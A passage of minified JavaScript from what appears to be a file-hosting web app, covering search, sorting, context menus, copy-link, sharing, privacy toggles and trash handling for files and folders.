span").trigger("click"),$("#sort_current").html('Match <span class="arrow_down"></span>'),MYF_fHideSpinner("search")}),0)}function afB(e,t,a,o){"let it snow"===t.toLowerCase()&&bnA(),bfw()&&bff(),a=!0,tH.aRL={files:{},folders:{}},MYF_fShowSpinner("search"),tH.aYp=!!tH.aYp||UO(),tH.aYp&&$("#viewtab1").click(),(t=t||"").length>=3&&(aGy=e,aHa.aIX(e.folderkey),aHa.aGY(e,t,a,filterBy,{success:function(e){try{gtag("event","search",{results:e.response.results})}catch(e){}var t=e.response.results,o=[];aGT=[],$.each(t,(function(e,t){"file"===t.type?tH.currentFolder.files[t.quickkey]?tH.aRL.files[t.quickkey]=tH.currentFolder.files[t.quickkey]:o.push(t.quickkey):tH.currentFolder.folders[t.folderkey]?tH.aRL.folders[t.folderkey]=tH.currentFolder.folders[t.folderkey]:aGT.push(t.folderkey)})),o.length||aGT.length?o.length?window.tH.Cp.asi(o,{success:function(e){if(1===o.length){var n=new tH.Cp(e.response.file_info);tH.aRL.files[n.quickkey]=n}else $.each(e.response.file_infos,(function(e,t){var a=new tH.Cp(t);tH.aRL.files[a.quickkey]=a}));aGT.length?window.tH.yJ.asi(aGT,{success:function(e){if(1===aGT.length){var a=new tH.yJ(e.response.folder_info);tH.aRL.folders[a.folderkey]=a}else $.each(e.response.folder_infos,(function(e,t){var a=new tH.yJ(t);tH.aRL.folders[a.folderkey]=a}));aGn(t)}}):aGn(t,a)}}):aGT.length&&window.tH.yJ.asi(aGT,{success:function(e){if(1===aGT.length){var a=new tH.yJ(e.response.folder_info);tH.aRL.folders[a.folderkey]=a}else $.each(e.response.folder_infos,(function(e,t){var a=new tH.yJ(t);tH.aRL.folders[a.folderkey]=a}));aGn(t)}}):aGn(t,a)},error:function(e){aGn([]);try{Zi(0,JSON.parse(e.responseText).response.message),console.warn("error searching files and folders.")}catch(e){}}}))}function aec(e,t){var a={data:{search_text:t,version:2.5}};"myfiles"!=e.folderkey&&""!=e.folderkey&&(a.data.folder_key=e.folderkey)}function MYF_SearchMode_fSortList(){var e={},t={};$.each(window.tH.XE,(function(a,o){o&&(o.filename?t[o.quickkey]=o:e[o.folderkey]=o)}));var a=[],o=[],n=[];"relevancy"==sortBy?(a=$.values(e),o=$.values(t),n=a.concat(o).sort(YT.relevancy)):(a=$.values(e).sort(YT.folder["created"==sortBy?"created":"name"]),o=$.values(t).sort(YT.file[sortBy]),n=a.concat(o)),sortAscending||n.reverse(),aoP(n,!0)}function aft(e,t){"trash"==tH.currentFolder.folderkey&&bfi(),tH.aVy=!0,tH.aRL={files:{},folders:{}},tH.XE=[];var a=!(!$("#search-text").val()||!$("#search-text").val().length);if($("#search-text").val("").attr("placeholder","Search").blur(),e||aBe(),afv()&&(a||t)){aBe(),$("#container").removeClass("searchmode searchresults searchmode_filter sort-relevancy"),$("#search_all_folders").hide(),$("#viewtab1, #viewtab2").show(),tH.aYp&&$("#viewtab2").click(),tH.aYp=null,void 0!==tH.XE&&$.each(tH.XE,(function(e){delete e.relevancy})),window.tH.XE&&delete window.tH.XE,window.tH.aca=[];var o=bfw();if("relevancy"==sortBy||o){var n=aL("mfsf-"+UserEmail),r=n&&"relevancy"!=n?n:"name";if((s=$('#myfiles_sortcontrol li[data-command="'+r+'"]')).length>0&&"name"!=r&&!o)s.click();else{var i=o?"expire":"created";sortAscending=!0,o?(abH(tH.currentFolder,!0),$("#container").addClass("sort-"+i),sortBy="name",$.publish("list/sort")):($("#myfiles_sortbyname").click(),$("#container").addClass("sort-"+i));var s,l=(s=$('#myfiles_sortcontrol li[data-command="'+i+'"]')).text();s.length>0&&($("#sort_current").html(l+' <span class="arrow_down"></span>'),s.find("span").addClass("arrow_down"))}}}else!$("#container").hasClass("searchmode_filter")||e||afv()||($("#myfiles_filtercontrol li[data-command='all']").click(),$("#search-text").val("").attr("placeholder","Search").blur(),$("#container").removeClass("searchmode_filter"))}function afJ(){$("#search_delete_button1, #search_exit_msg").click((function(e){aft(!1,!0)})),"all"!=filterBy?$.subscribe("folder/render"):$.subscribe("folder/render",aft),$("#viewAllImagesToolTip").click((function(e){aft()})),$("#search-text").focus((function(){aeT()})),$("#search-text").bind("keydown","esc",(function(){aft(!1,!0)})),$("#search-text").bind("keydown",debounce((function(e){aoK(e)}),400)),$(".searchWrap").bind("clickoutside",(function(e){afv()&&!$("#search-text").val()&&aft(!1,!0)}))}MYF_CompletionCounter.prototype.inc=function(){return++this.completed,this.completed>=this.to_complete};var MYF_oSpinnerCauses={};function MYF_fShowSpinner(e){var t=!$.isEmptyObject(MYF_oSpinnerCauses);MYF_oSpinnerCauses[e]=!0,t||($("body").addClass("pageSpinner"),$("#main_files_container").css("opacity",.5))}function MYF_fHideSpinner(e){$.isEmptyObject(MYF_oSpinnerCauses)||(delete MYF_oSpinnerCauses[e],$.isEmptyObject(MYF_oSpinnerCauses)&&($("body").removeClass("pageSpinner"),$("#main_files_container, #folderTree").css("opacity","")))}function aqU(e){var t=new RegExp("(\\"+["*","?","\\","/"].join("|\\")+")","g");return(""+e).replace(t," ")}function aoK(e){if(27==(e=e||window.event).keyCode)return aft();e.target.value&&0!=(e.target.value+"").replace(" ","").length||MYF_fHideSpinner("search");var t=aqU(e.target.value);13==e.keyCode&&(aeT(),t.length<3?Zi(0,"The search term must be at least 3 characters in length."):t.length&&afB(window.tH.currentFolder,t,"global"==$("input[name='searchscope']:checked").val())),$(window).scrollTop(0)}function abh(e,t){var a;if(!e.originalEvent.dataTransfer.files||0==e.originalEvent.dataTransfer.files.length){if(a=JSON.parse(e.originalEvent.dataTransfer.getData("Text"))){var o=t||$(this).data("key");LF.YO(a.files,a.folders,o)}return e&&aeV(e),mainList.aTN(),!1}}function aIh(e,t){var a;if(!e.originalEvent.dataTransfer.files||0==e.originalEvent.dataTransfer.files.length){if(a=JSON.parse(e.originalEvent.dataTransfer.getData("Text"))){var o=t||$(this).data("key");LF.aFI(a.files,a.folders,o)}return e&&aeV(e),mainList.aTN(),!1}}function aTw(e){return function(){var t,a=function(){$("input").blur(),$(".popup:visible").find(".popup-close").click()};$(".popup_content").delegate("keydown","esc",a),$("#page_screen").click((function(e){$(".popup:visible").find(".popup-close").click(),aeV(e)}));var o,n=[];t=e>=0?{open:function(e){if("popup"==e?o.open():zW(e,0),Clipboard.isSupported()){n.forEach((function(e){e&&e.destroy()})),n=[];var t=new Clipboard($("#dropbox-copy-link")[0],{text:function(){return $("#dbx_text_embeded").val()}}),a=new Clipboard($("#hostedfiledrop-copy-link")[0],{text:function(){return $("#hostedfiledrop_text_share").val()}}),r=function(e){Zi(0,"Copied to Clipboard")};t.on("success",r),a.on("success",r),n.push(t),n.push(a)}else $("#dropbox-copy-link").hide(),$("#hostedfiledrop-copy-link").hide()},popup:o=$("#create_dropbox_popup").popup().data("popup"),close:o.close}:function(){var e=$("#create_dropbox_popup").popup().data("popup");return{open:function(t){e.open()},popup:e,close:e.close}}(),aij("#dbx_input_header","span.fileDropPreviewCount",parseInt($("#dbx_input_header").attr("maxlength"),10),!0,!1,!0);var r=alT("#form-save",templates),i=function(){var e,t=$("#bulk-download-confirm").popup(),a=t.data("popup");return t.delegate(".confirm","click",(function(t){aME&&(aME={}),LF.aUA(e.keys),Zi(0,"Your bulk download is being prepared."),a.close(),aeV(t)})),awJ(t,!0,!0),{open:function(o){e=o,t.find("#bulk-download-confirm-items").html(o.count),a.open(),t.find(".confirm").focus()},popup:a,close:a.close}}(),s=awP("#form-move",templates),l=aFj("#form-copy",templates),d=aIt("#form-dest",templates),c=aVH("#upload-existing-file-conflict",templates),f=ri("#create-folder",templates),u=avA("#delete-folders-files",templates),p=avx("#privacy-file","file",templates),h=aRC("#action-choice-file",templates),m=aOx("#collaborate-file",templates),g=avx("#privacy-folder","folder",templates),y=awZ("#details-file","file",templates),v=awZ("#details-folder","folder",templates),w=bdt("#create-file","file",templates),b=awo("#update-file",templates),_=avk("#password-file",templates),k=asx("#rss-share-popup",templates);return{aai:s,aFW:l,avb:r,aXh:d,yw:u,abB:p,abz:g,aby:y,abC:v,aRo:w,aim:_,ajj:ayB("#create_new_account_popup",templates),GA:b,Xv:function(){var e=CreateSharePopup("sharebox",templates);function t(e){var t=$("#sharebox").find(".share-popup");t&&e&&t.addClass(e)}return{open:function(o){var n=("string"==typeof o.files&&o.files.length>0?o.files.split(","):o.files)||[],r=("string"==typeof o.folders&&o.folders.length>0?o.folders.split(","):o.folders)||[];e.Clear(),$.each(n,(function(t,a){var o=tH.files.yx(a);o||(o=window.tH.currentFolder.files[a]);var n=aek||o.shared;o.permissions&&3===NZ(o)&&(n=!1);var r="private"==o.privacy;void 0!==o.share_link_enabled&&"yes"!=o.share_link_enabled&&(r=!0),e.ald(o.quickkey,o.filename,o.size,o.filetype,o.hash,aCf(o),r,n,NZ(o))})),$.each(r,(function(t,a){var o=tH.folders.yx(a);o||(o=window.tH.currentFolder.folders[a]);var n=aek||!0===o.shared||"yes"==o.shared;o.permissions&&3===NZ(o)&&(n=!1);var r="private"==o.privacy;void 0!==o.share_link_enabled&&"yes"!=o.share_link_enabled&&(r=!0),e.akb(o.name,o.folderkey,r,n,NZ(o))}));var i=new window.tH.Dv;acK?e.Show(null,"loginShare"):i.Yw((function(o){var r=!1,i={facebook:null,gmail:null,twitter:null},s=o.response;if("Success"==s.result)for(var l in 1==avH(s.user_info.options,4)&&(r=!0),i)if(s.user_info[l]){var d=s.user_info[l].synced;d&&"0000-00-00 00:00:00"!=d&&(i[l]=d)}e.Show(null,aZn||aZS?"":"unverifiedShare",!1,i),function(e){var o=[],r=[];$.each(n,(function(a,n){var i=window.tH.currentFolder.files[n]||tH.files.yx(n);i&&(aZS||!i.dmca||e||(t("dmcaReviewPop"),o.push(i.quickkey),r.push(i.hash)),aZS||!i.copyright||e||t("copyrightPop"),i.fileInfected&&t("virusPop"))})),o.length&&$("#sharebox").undelegate("#share-box-dmca-button","click").delegate("#share-box-dmca-button","click",(function(e){var t=r.join(",");a(),LoadIframeLightbox("/templates/dmca_lightbox.html",500,475),t.dmca_company||awS(t,(function(e){setTimeout((function(){awQ(e,o)}),500)})),aeV(e)}))}(r)})),tH.currentFolder.shared&&"no"!=tH.currentFolder.shared?$("#sharebox").addClass("conservative"):acK||aek||$("#sharebox").removeClass("conservative")},popup:e.popup,close:function(){e.Hide()},ali:e.ali,ShowTab:e.ShowTab}}(),Dq:function(){this,auA&&auA.$list.filter(".selectable").delegate("a.folder_name","click",(function(e){var t=$(this),a=t.closest(".myaccountlist_content");return $("#save-create-subfolder-content").hide(),$("#save-create").show(),$("#save-create-subfolder-name").val(""),a.find(".current_folder_location").removeClass("current_folder_location"),t.closest("li").addClass("current_folder_location expanded").removeClass("collapsed"),!1}))},abU:a,aUD:c,abV:f,afh:t,apJ:i,arW:k,aNJ:m,MYF_oFileChoice:h}}()}var awr=!1;function aIP(){var e=$("#contextmenu"),t=!1,a={open:function(o,n,r,i,s,l){if(a.aoh(),e.removeClass("image video canEdit hasPreview collab-folder-menu collab-folder-menu-view collab-folder-menu-edit collab-folder-menu-managecollab-file-menu collab-file-menu-view collab-file-menu-edit collab-file-menu-managecollab-mix-menu-view collab-mix-menu-edit collab-mix-menu-manage hasPassword showFollowing showFollow shareLinkDisabled"),bho=!1,"file"==n)(p=tH.files.yx(i))&&p.delete_date&&(bho=!0);else if("folder"==n||"linked-folder"==n||"sublinked-folder"==n){(f=tH.folders.yx(i))&&f.delete_date&&(bho=!0)}else if("multiple"==n){if(i.folders)for(var d=i.folders.split(","),c=0;c<d.length;c++){var f;if((f=tH.folders.yx(d[c]))&&f.delete_date){bho=!0;break}}if(!bho&&i.files){var u=i.files.split(",");for(c=0;c<u.length;c++){var p;if((p=tH.files.yx(u[c]))&&p.delete_date){bho=!0;break}}}}("linked-folder"!=n&&"sublinked-folder"!=n||(i=("linked-folder"==n?"shared-":"sub-")+i,n="folder"),bho&&(n="trashMode"),"file"==n)&&((p=tH.files.yx(i))&&p.filetype&&"image"===p.filetype&&e.addClass("image"),p&&p.axV()&&e.addClass("hasPreview"),p&&p.aFP()&&aTB(window.tH.currentFolder)&&e.addClass("canEdit"));$(["#contextmenu",o,n].join("-")).show().closest(".dropdown").data("context",i),$(["#contextmenu",o,n].join("-")).trigger("acN"),e.removeClass("hide").addClass("show").css(r),t=!0,$(["#contextmenu",o,n].join("-")).trigger("adm",[s,l]),awr=!1,e.on("clickoutside",(function(e){awr?awr=!1:a.aoh()})),$("#main_files_container").on("mouseup.ContextMenu",(function(e){awr=3==e.which}))},aoh:function(){$.each($(".row_context"),(function(e,t){$(this).hasClass("file_selected")||mainList.aNK($(this).data("key"))})),e.hide().children("ul").hide().removeData("context"),e.removeClass("image video canEdit hasPreview collab-folder-menu collab-folder-menu-view collab-folder-menu-edit collab-folder-menu-managecollab-file-menu collab-file-menu-view collab-file-menu-edit collab-file-menu-managecollab-mix-menu-view collab-mix-menu-edit collab-mix-menu-manage hasPassword showFollowing showFollow shareLinkDisabled"),$(".row_context").removeClass("row_context"),e.removeClass("fixed show").addClass("hide"),t=!1,e.off("clickoutside"),$("#main_files_container").off("mouseup.ContextMenu")},isVisible:function(){return t},CD:function(){t?this.aoh():this.open.apply(null,arguments)},Wn:function(e,t,a){var o=$(window),n=e.parent(),r=parseInt(n.css("left")),i=parseInt(n.css("top"));function s(){(t||e.width()+r>o.width()&&r-e.width()>=0)&&n.css("left",r-e.outerWidth()+"px"),i-(e.height()+20)>=0&&(a||e.height()+i-o.scrollTop()>o.height())&&n.css("top",i-e.outerHeight()+3+"px"),n.hasClass("fixed")&&n.css("top",i-parseInt(o.scrollTop())+"px")}s(),setTimeout(s,0)},anX:function(e){var t=parseInt(e.parent().parent().parent().css("top"))+100,a=parseInt(e.parent().parent().parent().css("left"))+100;80+t-$(window).scrollTop()>$(window).height()&&t-e.height()>=0?e.css("top",-45):e.css("top",0),205+a>$(window).width()&&a-205>=0?e.css("left","55%"):e.css("left","100%")},aan:function(e){var t="Copied to Clipboard",a=$(this).closest("ul");e&&("contextmenu-mainlist-multiple"===a.attr("id")?t+="<br />Warning: One or more items were private, but have now been made public.":t+="<br />Warning: This item was private, but has now been made public."),Zi(0,t),mainList.aTN()}};return aSC(a),a}var MYF_aClipboards=[];function aSC(e){$("#contextmenu-mainlist-file").on("acN",(function(){var e=$(this).closest(".dropdown").data("context"),t=tH.files.yx(e);if(void 0===t){var a=$("#file-"+e+" .file_location a").attr("href").substr("#search-".length);t={parent:new tH.yJ(a)}}if($("#contextmenu").toggleClass("hasPassword","yes"==t.password_protected),$("#contextmenu").toggleClass("canEdit",aGe(t)),!aTB(t)){var o=NZ(t);$("#contextmenu").toggleClass("showFollow",0==o).toggleClass("showFollowing",0!=o).toggleClass("collab-file-menu-view",1==o).toggleClass("collab-file-menu-edit",2==o).toggleClass("collab-file-menu-manage",3==o).toggleClass("shareLinkDisabled",!t.privacy||"private"==t.privacy)}$("#file-"+e).addClass("row_context"),$("#file-"+e).hasClass("development")?$("#contextmenu").addClass("development-item"):$("#contextmenu").removeClass("development-item")})).on("adm",(function(t,a,o){var n=$(this),r=n.closest(".dropdown").data("context"),i=tH.files.memory[r];$("#contextmenu").toggleClass("private-item-menu",i.abL()),e.Wn(n,a,o),$("#contextmenu").toggleClass("video","video"==i.filetype).toggleClass("audio","audio"==i.filetype),aTB(i)||NZ(i);var s=n.find('li[data-command="copy-link"]');if(Clipboard.isSupported()){if(MYF_aClipboards.forEach((function(e){e&&e.destroy()})),MYF_aClipboards=[],s[0]){var l=n.closest(".dropdown").data("context"),d=tH.files.yx(l),c=!1,f=new Clipboard(s[0],{text:function(){var e=$("#contextmenu-mainlist-file").closest("ul");if(e.removeClass("private-item-menu"),c=!1,"private"===d.privacy){(d=new tH.Cp(d)).privacy="public",d.aax((function(){tH.files.memory[l].privacy="public"})),e.addClass("private-item-menu"),c=!0;var t=$("#file-"+l);t.length&&t.removeClass("private").addClass("public").find(".shareLinkEnabled").show()}return agW(d)}});f.on("success",(function(){try{gtag("event","copy_link")}catch(e){}e.aan(c)})),MYF_aClipboards.push(f)}}else s.hide();if(!i)return!1;var u="yes"==i.password_protected;try{n.find("li[data-command='share']").show(),n.find("li[data-command='public']").toggle(i.abL()),n.find("li[data-command='private']").toggle(i.Zt()),n.find("li[data-command='save-file']").toggle(!Yb&&0!==aek&&!u),n.find("li[data-command='password']").text("Password Protect"),n.find("li[data-command='set-avatar']").toggle("image"==i.filetype);n.find("li[data-command='file-preview']").text("View")}catch(e){try{console.warn(e)}catch(e){}}})).on("click","li[data-command]",(function(t){var a=$(this),o=a.data("command"),n=a.closest(".dropdown").data("context"),r=tH.files.memory[n];switch(aTB(r)||(!0,NZ(r)),o){case"copy-link":break;case"save-file":aZe?GH.avb.open(n):blX("RequiresLogin");break;case"download":akO({files:[n]},"context_menu");break;case"share":R({files:[n]});break;case"file-preview":try{gtag("event","view_image")}catch(t){}var i="view";"video"==r.filetype?i="watch":"audio"==r.filetype&&(i="listen"),window.open("/"+i+"/"+n+"/"+aNy(r.filename));break;case"collab-file":GH.aNJ.open(n);break;case"move":GH.aai.open(n);break;case"copy-items":GH.aFW.open({files:[n]});break;case"delete":GH.yw.open(n);break;case"rename":aTn(n,"file");break;case"desc":GH.aby.open(n,"description");break;case"stats":aiM(n);break;case"password":GH.aim.open(n,fu);break;case"public":GH.abB.open("public",n);break;case"private":GH.abB.open("private",n);break;case"set-avatar":QZ(n)}e.aoh(),aeV(t)})).on("mouseenter",".dropdown li.submenu",(function(t){var a=$(this).find(".submenu-sendto");a.show(),e.anX(a),aeV(t)})).on("mouseleave",".dropdown li.submenu",(function(e){$(this).find(".submenu-sendto").hide(),aeV(e)})),$("#contextmenu-mainlist-folder").off("acN adm").off("click","li[data-command]").off("mouseenter mouseleave",".dropdown li.submenu").on("acN",(function(){var e=$(this).closest(".dropdown").data("context"),t=tH.folders.yx(e);if(!aTB(t)){!0;var a=NZ(t);$("#contextmenu").toggleClass("showFollow",0==a).toggleClass("showFollowing",0!=a).toggleClass("collab-folder-menu-view",1==a).toggleClass("collab-folder-menu-edit",2==a).toggleClass("collab-folder-menu-manage",3==a).toggleClass("shareLinkDisabled",!t.privacy||"private"==t.privacy)}SHARED?$("li[data-command='rename']").removeClass("multimode-item").addClass("normal-item"):$("li[data-command='rename']").addClass("multimode-item").removeClass("normal-item"),$("#folder-"+e).addClass("row_context")})).on("adm",(function(t,a,o){var n=$(this),r=n.closest(".dropdown").data("context"),i=tH.folders.yx(r),s=!1;aTB(i)||(s=!0,NZ(i));var l=n.find('li[data-command="copy-link"]');if(Clipboard.isSupported()){if(MYF_aClipboards.forEach((function(e){e&&e.destroy()})),MYF_aClipboards=[],l[0]){var d=n.closest(".dropdown").data("context"),c=tH.folders.yx(d),f=!1,u=new Clipboard(l[0],{text:function(){var e=$("#contextmenu-mainlist-folder").closest("ul");if(e.removeClass("private-item-menu"),f=!1,"private"===c.privacy){(c=new tH.yJ(c)).aax((function(){tH.folders.memory[d].privacy="public"})),e.addClass("private-item-menu"),f=!0;var t=$("#folder-"+d);t.length&&t.removeClass("private").addClass("public").find(".shareLinkEnabled").show()}return agW(c)}});u.on("success",(function(){try{gtag("event","copy_link")}catch(e){}e.aan(f),ValidateFolderCopyLinkSafe(d)})),MYF_aClipboards.push(u)}}else l.hide();$("#contextmenu").toggleClass("private-item-menu",i.abL()),e.Wn(n,a,o);try{n.find("li[data-command='public']").toggle(i.abL()&&!s),n.find("li[data-command='private']").toggle(i.Zt()&&!s)}catch(e){try{console.warn(e)}catch(e){}}})).on("click","li[data-command]",(function(t){var a=$(this),o=a.data("command"),n=a.closest(".dropdown").data("context"),r=tH.folders.yx(n);switch(aTB(r)||(!0,NZ(r)),o){case"copy-link":break;case"unfollow-folder":aMk(n);break;case"download":akO({folders:[n]},"context_menu");break;case"subfolder":GH.abV.open(n);break;case"share":R({folders:[n]});break;case"move":GH.aai.open(null,n);break;case"copy-items":GH.aFW.open({files:[],folders:[n]});break;case"delete":GH.yw.open(null,n);break;case"rename":aTn(n,"folder");break;case"desc":GH.abC.open(n,"description");break;case"dropbox":GH.afh.open(n);break;case"public":GH.abz.open("public",n);break;case"private":GH.abz.open("private",n);break;case"rss":GH.arW.open(r);break;default:try{console.warn("unrecognized command")}catch(t){}}e.aoh(),aeV(t)})).on("mouseenter",".dropdown li.submenu",(function(t){var a=$(this).find(".submenu-sendto");a.show(),e.anX(a),aeV(t)})).on("mouseleave",".dropdown li.submenu",(function(e){$(this).find(".submenu-sendto").hide(),aeV(e)})),$("#contextmenu-mainlist-multiple").off("acN adm").off("mousedown click","li[data-command]").on("acN",(function(){$.publish("list/selection");var e=$(this),t=tH.MYF_oSelected,a=!!t.files.length&&t.files,o=!!t.folders.length&&t.folders;aek&&(e.find("li[data-command='save-file']").hide(),Yb||(a.length>1&&!o.length?e.find("li[data-command='save-file']").show():e.find("li[data-command='save-file']").hide()))})).on("adm",(function(t,a,o){var n=$(this),r=tH.MYF_oSelected,i=!!r.files.length&&r.files,s=!!r.folders.length&&r.folders,l=i||[],d=s||[],c=!0;$.each(i,(function(e,t){$("#file-"+t).addClass("row_context")})),$.each(s,(function(e,t){$("#folder-"+t).addClass("row_context")}));for(var f=!1,u=0;u<i.length;u++){var p=tH.files.memory[i[u]];"yes"!=p.password_protected&&c&&(c=!1),"image"==p.filetype&&(f=!0),p.fileInfected&&!0}var h=n.find('li[data-command="copy-link"]');if(Clipboard.isSupported()){if(MYF_aClipboards.forEach((function(e){e&&e.destroy()})),MYF_aClipboards=[],h[0]){l=tH.MYF_oSelected.files||[],d=tH.MYF_oSelected.folders||[];var m=!1,g=new Clipboard(h[0],{text:function(){var e=$("#contextmenu-mainlist-multiple").closest("ul");return e.removeClass("private-item-menu"),m=!1,$.each(l,(function(t,a){var o=tH.files.memory[a];if("private"===o.privacy){(o=new tH.Cp(o)).aax((function(){tH.files.memory[a].privacy="public"})),e.addClass("private-item-menu"),m=!0;var n=$("#file-"+a);n.length&&n.removeClass("private").addClass("public").find(".shareLinkEnabled").show()}})),$.each(d,(function(t,a){var o=tH.folders.memory[a];if("private"===o.privacy){(o=new tH.yJ(o)).aax((function(){tH.folders.memory[a].privacy="public"})),e.addClass("private-item-menu"),m=!0;var n=$("#folder-"+a);n.length&&n.removeClass("private").addClass("public").find(".shareLinkEnabled").show()}})),adv("folder",l.concat(d).join(","),"shared")}});g.on("success",(function(){try{gtag("event","copy_link")}catch(e){}e.aan(m),ValidateFolderCopyLinkSafe(adQ)})),MYF_aClipboards.push(g)}}else h.hide();n.find("li[data-command='share']").toggle(!(l.length>0&&d.length>0)),n.find("li[data-command='update']").toggle(!f&&i&&2===i.length&&!s&&(!aek||Yb)),n.find("li[data-command='save-file']").toggle(!Yb&&!c&&aek&&(!tH.MYF_oSelected.files.length||!tH.MYF_oSelected.folders.length));var y="";if(i&&s?y="mix":i?y="file":s&&(y="folder"),!aTB(tH.currentFolder)&&""!=y){var v=3,w=!0;i&&$.each(i,(function(e){var t=tH.files.yx(i[e]),a=NZ(t);if(v=a<v?a:v,w&&(w=!(!t.privacy||"private"==t.privacy)),0==v)return!1})),s&&0!=v&&$.each(s,(function(e){var t=tH.folders.yx(s[e]),a=NZ(t);if(v=a<v?a:v,w&&(w=!(!t.privacy||"private"==t.privacy)),0==v)return!1})),$("#contextmenu").toggleClass("collab-"+y+"-view",1==v).toggleClass("collab-"+y+"-edit",2==v).toggleClass("collab-"+y+"-manage",3==v).toggleClass("shareLinkDisabled",!w)}e.Wn(n,a,o)})).on("mousedown","li[data-command]",(function(e){var t=$(this);switch(t.data("command")){case"view-items":aRM($("a",t))}})).on("click","li[data-command]",(function(t){var a=$(this),o=a.data("command"),n=a.closest(".dropdown").data("context");switch(o){case"copy-link":break;case"view-items":return!0;case"move":GH.aai.open(n.files,n.folders);break;case"copy-items":GH.aFW.open(window.tH.MYF_oSelected);break;case"delete":GH.yw.open(n.files,n.folders);break;case"email":R(tH.MYF_oSelected),GH.Xv.ShowTab("email");break;case"download":adI();break;case"share":R(window.tH.MYF_oSelected);break;case"update":GH.GA.open(n.files);break;case"dropbox":GH.afh.open(a.data("key"));break;case"save-file":aZe?GH.avb.open(n.files):blX("RequireLogin");break;default:try{console.warn("unrecognized command")}catch(t){}}e.aoh(),aeV(t)})),$("#contextmenu-mainlist-trashMode").off("acN adm").off("mousedown click","li[data-command]").on("acN",(function(){$.publish("list/selection")})).on("adm",(function(t,a,o){var n=$(this),r=tH.MYF_oSelected,i=!!r.files.length&&r.files,s=!!r.folders.length&&r.folders;n.find(".number_of_selectedobjects").toggle(r.files.length+r.folders.length>1),i||s?($.each(i,(function(e,t){$("#file-"+t).addClass("row_context")})),$.each(s,(function(e,t){$("#folder-"+t).addClass("row_context")}))):(r=n.closest(".dropdown").data("context"),tH.files.memory[r]?$("#file-"+r).addClass("row_context"):tH.folders.memory[r]&&$("#folder-"+r).addClass("row_context")),e.Wn(n,a,o)})).on("click","li[data-command]",(function(t){var a=$(this),o=a.data("command"),n=a.closest(".dropdown").data("context"),r=n.folders||"",i=n.files||"";switch(0==r.length&&0==i.length&&(tH.files.memory[n]?i=n:tH.folders.memory[n]&&(r=n)),o){case"delete":LF.bet(i,r,!0);break;case"restore":GH.aXh.open({success:function(e){LF.YO(i,r,e)}});break;default:try{console.warn("unrecognized command")}catch(t){}}e.aoh(),aeV(t)})),$("#contextmenu-folderbrowser-folder").off("acN adm click").off("click","li[data-command]").on("acN",(function(){var e=$(this),t=e.closest(".dropdown").data("context").split("-"),a=t[0];t.length>1&&("shared"==t[0],a=t[1]),$("[data-folderkey='"+a+"']").addClass("row_context"),e.parent().addClass("fixed")})).on("adm",(function(){var t=$(this),a=!1,o=t.closest(".dropdown").data("context").split("-"),n=o[0],r=!1,i=0;o.length>1&&("shared"==o[0],a=!0,n=o[1]);var s=tH.folders.yx(n);aTB(s)||(r=!0,i=NZ(s));var l=t.find('li[data-command="copy-link"]');if(Clipboard.isSupported()){var d,c=!1;if(aek&&afI.split(",").length>=1)d=function(){var e=$("#contextmenu-folderbrowser-folder").closest("ul");return e.removeClass("private-item-menu"),c=!1,$.each(afI.split(","),(function(t,a){var o=tH.folders.memory[a];"private"===o.privacy&&((o=new tH.yJ(o)).aax((function(){tH.folders.memory[a].privacy="public"})),e.addClass("private-item-menu"),c=!0)})),adv("folder",afI,"shared")};else if("myfiles"!==n){var f=tH.folders.yx(n);if(f){var u=Encoder.XSSEncode(aNy(f.name))||"";d=function(){return adv("folder",n,u)}}}if(d){var p=new Clipboard(l[0],{text:d});p.on("success",(function(){try{gtag("event","copy_link")}catch(e){}e.aan(c),ValidateFolderCopyLinkSafe(n)})),MYF_aClipboards.push(p)}}else l.hide();$("#folderbrowser-unfollow").toggle(r&&aTB(s.parent)&&0!=i),aek?($("#folderbrowser-copylink").show(),$("#folderbrowser-rename").hide(),$("#folderbrowser-delete").hide(),$("#folderbrowser-subfolder").hide(),$("#folderbrowser-add").toggle(!("myfiles"==n)),$("#folderbrowser-share").show()):"myfiles"==n?($("#folderbrowser-copylink").hide(),$("#folderbrowser-rename").hide(),$("#folderbrowser-delete").hide(),$("#folderbrowser-subfolder").show(),$("#folderbrowser-share").hide()):($("#folderbrowser-copylink").show(),r?($("#folderbrowser-rename").toggle(2==i),$("#folderbrowser-subfolder").toggle(2==i),$("#folderbrowser-delete").toggle(2==i),$("#folderbrowser-share").hide()):($("#folderbrowser-rename").show(),$("#folderbrowser-subfolder").show(),$("#folderbrowser-delete").toggle(!a),$("#folderbrowser-share").show())),e.Wn(t),$("[data-folderkey='"+n+"']").addClass("row_context")})).on("click","li[data-command]",(function(t){var a=$(this),o=a.data("command"),n=a.closest(".dropdown").data("context").split("-"),r=n[0];switch(n.length>1&&(r=n[1]),folderkey=r,o){case"rename":GH.abC.open(folderkey,"name");break;case"subfolder":GH.abV.open(folderkey);break;case"copy-link":break;case"delete":GH.yw.open(null,folderkey);break;case"share":R({folders:[folderkey]});break;default:try{console.warn("unrecognized command")}catch(t){}}e.aoh(),aeV(t)}))}function aMk(e){var t=tH.folders.yx(e);(new tH.aCa).aAe(e,{success:function(e){e&&e.response&&e.response.result&&"success"===e.response.result.toLowerCase()?(Zi(0,"You are no longer following the folder '"+t.name+"'. You may view all the items you follow within the Following App."),setTimeout((function(){"private"==t.privacy?top.Rz("shared-items"):location.reload(!0)}),1e3)):Zi(0,"Unable to stop following the folder '"+t.name+"' at this time. Please try again later")},error:function(){Zi(0,"Unable to stop following the folder '"+t.name+"' at this time. Please try again later")}})}function aTE(){LF.Zs.onBefore=function(e,t){var a=null;if(t)for(var o=tH.currentFolder;o&&"myfiles"!=o.folderkey;){if(-1!==t.indexOf(o.folderkey)){a=o;break}if("myfiles"==o.parent_folderkey)break;o=o.parent||tH.folders.yx(o)}a&&(window.location.hash="#"+(a.parent_folderkey||a.parent.folderkey||"myfiles")),e.length&&$.each(e,(function(e,t){$("#file-"+t).hide()})),t.length&&$.each(t,(function(e,t){$("#folder-"+t).hide()}))},LF.Zs.onSuccess=function(e,t){e&&$.publish("file/delete",[e,!1]),t&&$.publish("folder/delete",[t,!1]),beg()},LF.bet.onSuccess=function(e,t){e&&$.publish("file/delete",[e,!0]),t&&$.publish("folder/delete",[t,!0]),aoP(tH.aca),beg()},LF.MYF_mEmptyTrash.onSuccess=function(){var e=tH.folders.yx("trash");window.tH.aca=[],aoP(window.tH.aca),e&&(e.total_files>0&&aH(0,e.total_files+" files deleted.",e.total_files+" files were deleted.",!0),e.total_folders>0&&aH(0,e.total_folders+" folders deleted.",e.total_folders+" folders were deleted.",!0),e.folders={},e.files={},e.total_files=0,e.total_folders=0),beg()},LF.YO.onBefore=function(e,t,a){var 